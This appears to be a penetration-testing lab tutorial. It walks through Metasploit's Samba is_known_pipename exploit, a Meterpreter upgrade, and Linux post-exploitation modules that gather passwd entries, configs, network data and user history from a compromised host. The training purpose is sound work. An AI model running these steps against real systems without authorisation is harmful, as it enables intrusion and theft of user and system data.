# Linux Post Exploitation Modules

- The MSF provides us with various post exploitation modules for both Windows and Linux.
- We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:
  - Enumerate system configuration
  - Enumerate environment variables
  - Enumerate network configuration
  - VM check
  - Enumerate user history

# Linux Post Exploitation Modules

## Overview

After successfully exploiting a Linux system, post-exploitation tasks focus on gathering information about the system and its users. Metasploit provides various **post-exploitation modules** that enable us to perform detailed enumeration and gather critical data from the compromised machine.

## Demo: Linux Post Exploitation Modules

### Step-by-Step Process

Start PostgreSQL and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for **Linux Post Exploitation**:

```bash
workspace -a Linux_PE
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

### Scanning and Exploiting

Perform an Nmap scan to identify services on the target system:

```bash
db_nmap -sV [targetIP]
```

Search for the **Samba exploit module**:

```bash
search type:exploit name:samba
```

Use the **Samba is_known_pipename** exploit module to gain initial access:

```bash
use exploit/linux/samba/is_known_pipename
```

Run the exploit to get a **cmd shell session**:

```bash
exploit
```

Check the current working directory:

```bash
pwd
```

Put the session in the background:

```bash
background
```

List all active sessions:

```bash
sessions
```

### Upgrading to Meterpreter Session

To upgrade the **cmd shell session** to a **Meterpreter session**, use the following command:

```bash
sessions -u 1
```

This will upgrade session 1 to a Meterpreter session, which will now be available as session 2.

### Basic Enumeration with the Linux Terminal

Once you have a **Meterpreter session**, you can begin basic system enumeration.

- Check system information:

    ```bash
    sysinfo
    ```

- Check the current user ID:

    ```bash
    getuid
    ```

- Open a Linux shell in the Meterpreter session:

    ```bash
    shell
    ```

- Switch to an interactive Bash shell:

    ```bash
    /bin/bash -i
    ```

- Find out which user is currently logged in:

    ```bash
    whoami
    ```

#### Enumerating User Accounts

- List all user accounts on the system:

    ```bash
    cat /etc/passwd
    ```

- Enumerate the groups of a specific user:

    ```bash
    groups [user]
    ```

#### Enumerating System Information

- Display the Linux distribution release version:

    ```bash
    cat /etc/*issue
    ```

- Display the kernel version:

    ```bash
    uname -r
    ```

- Get detailed system information:

    ```bash
    uname -a
    ```

#### Enumerating Network Information

- Display network interface configuration:

    ```bash
    ifconfig
    ```

- Alternatively, use:

    ```bash
    ip a s
    ```

#### Enumerating Processes

- List running processes:

    ```bash
    ps aux
    ```

#### Enumerating Environment Variables

- Display the environment variables:

    ```bash
    env
    ```

### Using Linux Post Exploitation Modules

#### Enum Configs Module

Search for the **Enum Configs** module:

```bash
search enum_configs
```

Use the module to enumerate configuration files on the target:

```bash
use post/linux/gather/enum_configs
```

Show the available options:

```bash
show options
```

Set the Meterpreter session (replace `[meterpreter session]` with the actual session number):

```bash
set session [meterpreter session]
```

Run the module to gather configuration files:

```bash
run
```

Review the gathered information using the **loot** command:

```bash
loot
```

Display the contents of a specific file:

```bash
cat [path]
```

#### Enumerating Environment Variables

Search for the **env** module:

```bash
search env platform:linux
```

Use the **environment variables** module:

```bash
use post/multi/gather/env
```

Set the session:

```bash
set session [meterpreter session]
```

Run the module:

```bash
run
```

#### Network Enumeration Module

Search for the **enum_network** module:

```bash
search enum_network
```

Use the **Network Enumeration** module to gather network-related information:

```bash
use post/linux/gather/enum_network
```

Show the options:

```bash
show options
```

Set the session:

```bash
set session [meterpreter session]
```

Run the module:

```bash
run
```

You can view the collected information with the **loot** command:

```bash
loot
```

Display specific files:

```bash
cat [path]
```

#### Checking Protection Systems

Search for the **enum_protections** module:

```bash
search enum_protections
```

Use the module to enumerate protection mechanisms on the target:

```bash
use post/linux/gather/enum_protections
```

Show the module info:

```bash
info
```

Set the session (assuming session 3 is active):

```bash
set session 3
```

Run the module:

```bash
run
```

To check where the data is stored, use the **notes** command:

```bash
notes
```

#### System & User Enumeration

Search for the **enum_system** module:

```bash
search enum_system
```

Use the module to enumerate system information:

```bash
use post/linux/gather/enum_system
```

Show the module info:

```bash
info
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

Review the gathered information with the **loot** command:

```bash
loot
```

For example, you can enumerate installed packages by viewing the respective file:

```bash
cat [path/to/installed/packages]
```

#### VM Check Enumeration

To check if the target is running inside a container, use the **checkcontainer** module:

```bash
use post/linux/gather/checkcontainer
```

Show the available options:

```bash
show options
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

To check if the target is running in a virtual machine, use the **checkvm** module:

```bash
search checkvm
use post/linux/gather/checkvm
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

#### Enumerating User History

Search for the **enum_users_history** module:

```bash
search enum_users_history
```

Use the module to gather user history:

```bash
use post/linux/gather/enum_users_history
```

Set the session:

```bash
set session 3
```

Run the module:

```bash
run
```

Review the gathered information:

```bash
loot
cat [path to linux.enum.users_749147.txt]
```

### Conclusion

What we accomplished:
- Gained access to a Linux system using the **Samba exploit**.
- Upgraded the initial **cmd shell** to a **Meterpreter session** for more advanced post-exploitation tasks.
- Performed basic system enumeration using the Linux terminal.
- Used various **post-exploitation modules** to gather system information, network details, user history, installed packages, and protection mechanisms.

These steps illustrate how to use Metasploit's post-exploitation modules for effective enumeration and data gathering on a compromised Linux system.






